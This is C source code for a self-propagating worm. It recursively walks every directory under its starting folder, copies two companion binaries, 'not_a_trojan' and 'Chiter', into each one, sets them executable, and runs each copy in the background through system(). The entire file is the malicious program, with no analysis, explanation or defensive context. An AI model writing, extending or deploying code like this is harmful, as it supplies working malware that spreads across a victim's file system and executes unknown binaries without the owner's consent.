#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/stat.h>

#define MAX_PATH_LEN 1024

void copy_file(const char* source_path, const char* dest_path);
const char* extract_filename(const char* path);

struct Worm {
    char path[MAX_PATH_LEN];
    char **target_dir_list;
    int target_dir_count;
    int iteration;
    char own_path[MAX_PATH_LEN];
};

void list_directories(struct Worm *worm, const char *path) {
    DIR *dir;
    struct dirent *entry;
    char full_path[MAX_PATH_LEN];

    dir = opendir(path);
    if (dir == NULL) {
        perror("Error opening directory");
        return;
    }

    worm->target_dir_list = realloc(worm->target_dir_list, (worm->target_dir_count + 1) * sizeof(char *));
    worm->target_dir_list[worm->target_dir_count] = strdup(path);
    worm->target_dir_count++;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] != '.') {
            snprintf(full_path, MAX_PATH_LEN, "%s/%s", path, entry->d_name);
            printf("%s\n", full_path);

            struct stat file_stat;
            if (stat(full_path, &file_stat) == 0 && S_ISDIR(file_stat.st_mode)) {
                list_directories(worm, full_path);
            }
        }
    }

    closedir(dir);
}

void create_new_worm(struct Worm *worm) {
    int i;
    char source_path[MAX_PATH_LEN];
    char dest_path[MAX_PATH_LEN];

    getcwd(source_path, MAX_PATH_LEN);
    strncat(source_path, "/not_a_trojan", MAX_PATH_LEN - strlen(source_path) - 1);

    for (i = 0; i < worm->target_dir_count; i++) {
        if (strcmp(worm->target_dir_list[i], worm->path) != 0) {
            snprintf(dest_path, MAX_PATH_LEN, "%s/not_a_trojan", worm->target_dir_list[i]);
            FILE *source = fopen(source_path, "rb");
            FILE *dest = fopen(dest_path, "wb");

            if (source && dest) {
                char buffer[1024];
                size_t bytes_read;

                while ((bytes_read = fread(buffer, 1, sizeof(buffer), source)) > 0) {
                    fwrite(buffer, 1, bytes_read, dest);
                }

                fclose(source);
                fclose(dest);

                // Update file permissions to make it executable
                chmod(dest_path, 0755);

                // directly execute the binary
                char command[MAX_PATH_LEN];
                snprintf(command, MAX_PATH_LEN, "%s &", dest_path); // Background execution
                system(command);
            } else {
                perror("Error opening file");
            }
        }
    }

    getcwd(source_path, MAX_PATH_LEN);
    strncat(source_path, "/Chiter", MAX_PATH_LEN - strlen(source_path) - 1);

    for (i = 0; i < worm->target_dir_count; i++) {
        if (strcmp(worm->target_dir_list[i], worm->path) != 0) {
            snprintf(dest_path, MAX_PATH_LEN, "%s/Chiter", worm->target_dir_list[i]);
            FILE *source = fopen(source_path, "rb");
            FILE *dest = fopen(dest_path, "wb");

            if (source && dest) {
                char buffer[1024];
                size_t bytes_read;

                while ((bytes_read = fread(buffer, 1, sizeof(buffer), source)) > 0) {
                    fwrite(buffer, 1, bytes_read, dest);
                }

                fclose(source);
                fclose(dest);

                // Update file permissions to make it executable
                chmod(dest_path, 0755);

                // directly execute the binary
                char command[MAX_PATH_LEN];
                snprintf(command, MAX_PATH_LEN, "%s &", dest_path); // Background execution
                system(command);
            } else {
                perror("Error opening file");
            }
        }
    }
}

void start_worm_actions(struct Worm *worm) {
    list_directories(worm, worm->path);
    create_new_worm(worm);

    // Free the memory allocated for the strings in the target_dir_list
    for (int i = 0; i < worm->target_dir_count; i++) {
        free(worm->target_dir_list[i]);
    }
}

int main() {
    struct Worm worm;
    getcwd(worm.path, MAX_PATH_LEN);
    worm.target_dir_list = NULL;
    worm.target_dir_count = 0;
    worm.iteration = 1;
    getcwd(worm.own_path, MAX_PATH_LEN);

    start_worm_actions(&worm);

    // Free the target_dir_list array
    free(worm.target_dir_list);

    return 0;
}